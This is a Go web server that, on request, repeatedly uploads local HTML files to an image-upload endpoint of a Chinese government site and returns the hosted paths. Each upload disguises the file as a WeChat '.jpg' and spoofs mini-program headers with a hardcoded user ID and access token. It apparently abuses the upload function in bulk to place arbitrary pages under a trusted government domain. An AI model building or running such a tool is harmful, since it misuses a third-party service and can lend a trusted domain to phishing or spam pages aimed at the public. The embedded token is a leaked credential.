package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"time"

	"github.com/gin-gonic/gin"
)

type responseData struct {
	Path string `json:"path"`
}

func main() {
	s := gin.Default()
	s.GET("/join/:num", func(c *gin.Context) {
		num := c.Param("num")

		numI, _ := strconv.Atoi(num)
		flist := []string{}
		var number = 0

		for i := 0; i < numI; i++ {
			number++
			if number >= 5 {
				time.Sleep(time.Second)
				number = 0
			}
			flist = append(flist, GetDomain(i, "join.html"))
		}

		stv := ""
		for _, v := range flist {
			stv += v + "\n"
		}
		c.String(http.StatusOK, stv)
	})

	s.GET("reset_domain/:name", func(c *gin.Context) {
		name := c.Param("name")
		if name == "" {
			c.String(http.StatusOK, "no file")
		}
		ResetDomain(name)
		c.String(http.StatusOK, name)
	})

	s.GET("action/:num", func(c *gin.Context) {
		num := c.Param("num")
		numI, _ := strconv.Atoi(num)
		flist := []string{}
		var number = 0
		for i := 0; i < numI; i++ {
			number++
			if number >= 5 {
				time.Sleep(time.Second)
				number = 0
			}
			flist = append(flist, GetDomain(i, "action.html"))
		}

		stv := ""
		for _, v := range flist {
			stv += v + "\n"
		}
		c.String(http.StatusOK, stv)

	})
	s.Run(":80")
}

func GetDomain(i int, filePath string) string {
	// 打开要上传的文件
	file, err := os.Open(filePath)
	if err != nil {
		fmt.Println(fmt.Errorf("failed to open file: %v", err))
		return ""
	}
	defer file.Close()

	// 创建一个缓冲区
	var requestBody bytes.Buffer
	writer := multipart.NewWriter(&requestBody)

	// 处理文件字段
	part, err := writer.CreateFormFile("file", filepath.Base(filePath))
	if err != nil {
		fmt.Println("failed to create form file: %v", err)
		return ""
	}

	// 将文件内容拷贝到 part 中
	_, err = io.Copy(part, file)
	if err != nil {
		fmt.Println("failed to copy file content: %v", err)
		return ""
	}

	// 添加其他字段
	err = writer.WriteField("imgName", "wxfile://tmp_17187c3d0c60b0e608753587765ccd4f.jpg")
	if err != nil {
		fmt.Println("failed to write imgName: %v", err)
		return ""
	}
	err = writer.WriteField("userId", "45842")
	if err != nil {
		fmt.Println("failed to write userId: %v", err)
		return ""
	}

	// 关闭写入器
	err = writer.Close()
	if err != nil {
		fmt.Println("failed to close writer: %v", err)
		return ""
	}

	// 创建 HTTP 请求
	req, err := http.NewRequest("POST", "https://www.ldt.gov.cn/appletController/uploadWXPic", &requestBody)
	if err != nil {
		fmt.Println("failed to create request: %v", err)
		return ""
	}

	// 设置请求头
	req.Header.Set("Reqable-Id", "reqable-id-aad5858c-15eb-4f8b-bf02-4eab027285d0")
	req.Header.Set("User-Agent", "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.54(0x18003637) NetType/WIFI Language/zh_CN")
	req.Header.Set("Accept-Encoding", "gzip,compress,br,deflate")
	req.Header.Set("Content-Type", writer.FormDataContentType())
	req.Header.Set("TOKEN", "61BB8C4C11D622EB0C2426FD178A9F85")
	req.Header.Set("Referer", "https://servicewechat.com/wx28c943968e60a1fc/11/page-frame.html")

	// 执行请求
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("failed to execute request: %v", err)
		return ""
	}
	defer resp.Body.Close()

	// 读取响应
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("failed to read response body: %v", err)
		return ""
	}

	// 输出响应内容
	fmt.Println("Response Status:", resp.Status)
	fmt.Println("Response Body:", string(body))
	var rp responseData
	json.Unmarshal(body, &rp)

	return rp.Path

}

func ResetDomain(fileName string) string {
	return ""
}
